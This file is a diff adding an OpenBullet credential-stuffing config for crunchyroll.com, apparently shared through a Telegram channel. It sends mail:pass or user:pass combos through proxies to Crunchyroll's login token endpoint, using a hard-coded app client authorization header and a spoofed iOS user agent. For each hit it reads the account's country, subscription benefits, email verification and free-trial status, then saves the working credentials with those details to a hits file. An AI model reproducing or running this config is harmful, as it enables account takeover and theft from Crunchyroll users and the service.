@@ -1,0 +1,151 @@
+[SETTINGS]
+{
+  "Name": "crunchyroll.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-16T12:46:46.6099155+04:30",
+  "AdditionalInfo": "https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 1068181308
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var id = uuidv4();
+END SCRIPT -> VARS "id"
+
+#ID FUNCTION ToUppercase "<id>" -> VAR "ID" 
+
+#Login REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token" EncodeContent=TRUE 
+  CONTENT "grant_type=password&password=<PASS>&scope=offline_access&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "Etp-Anonymous-Id: <ID>" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic ZS1heHhqcnBxYmllLXJiX3Qza2Q6UnhmZU9sVWF0MWs2N0JhcnV3XzVpR1hlbEV2bkdacmI=" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: Crunchyroll/4.6.0 (bundle_identifier:com.crunchyroll.iphone; build_number:1995319.366913730) iOS/14.5.1 Gravity/3.0.0" 
+  HEADER "Accept-Language: en-US;q=1.0, fa-US;q=0.9" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+    KEY "invalid_grant" 
+  KEYCHAIN Success OR 
+    KEY "access_token\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "406" 
+
+#Country PARSE "<SOURCE>" LR "country\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#Token PARSE "<SOURCE>" LR "access_token\":\"" "\"" -> VAR "Token" 
+
+#Get REQUEST GET "https://beta-api.crunchyroll.com/accounts/v1/me" 
+  
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: Crunchyroll/4.6.0 (bundle_identifier:com.crunchyroll.iphone; build_number:1995319.366913730) iOS/14.5.1 Gravity/3.0.0" 
+  HEADER "Accept-Language: en-US;q=1.0, fa-US;q=0.9" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "Connection: close" 
+
+#External PARSE "<SOURCE>" LR "external_id\":\"" "\"" -> VAR "External" 
+
+#Get REQUEST GET "https://beta-api.crunchyroll.com/subs/v1/subscriptions/<External>/benefits" 
+  
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: Crunchyroll/4.6.0 (bundle_identifier:com.crunchyroll.iphone; build_number:1995319.366913730) iOS/14.5.1 Gravity/3.0.0" 
+  HEADER "Accept-Language: en-US;q=1.0, fa-US;q=0.9" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "Connection: close" 
+
+IF "<SOURCE>" Contains "subscription.not_found"
+SET STATUS CUSTOM "FREE"
+ENDIF
+
+#Subscription PARSE "<SOURCE>" LR "\"benefit\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Get REQUEST GET "https://beta-api.crunchyroll.com/accounts/v1/me/profile" 
+  
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: Crunchyroll/4.6.0 (bundle_identifier:com.crunchyroll.iphone; build_number:1995319.366913730) iOS/14.5.1 Gravity/3.0.0" 
+  HEADER "Accept-Language: en-US;q=1.0, fa-US;q=0.9" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "Connection: close" 
+
+#EV PARSE "<SOURCE>" LR "crleg_email_verified\":" "," -> VAR "EV" 
+
+#email_verified FUNCTION Translate 
+  KEY "false" VALUE "No" 
+  KEY "true" VALUE "Yes" 
+  "<EV>" -> CAP "email verified" 
+
+#FT PARSE "<SOURCE>" LR "opt_out_free_trials\":" "," -> VAR "FT" 
+
+#free_trial FUNCTION Translate 
+  KEY "false" VALUE "No" 
+  KEY "true" VALUE "Yes" 
+  "<FT>" -> CAP "free trial" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "crunchyroll.com hits.txt" Append "<USER>:<PASS>\\nCountry: <Country>\\nSubscription: <Subscription>\\nemail verified: <email verified>\\nfree trial: <free trial>\\nTelegram Channel: https://t.me/OpenBulletChannel\\n---------------------------------------------------------------\\n" -> VAR "Save" 
+
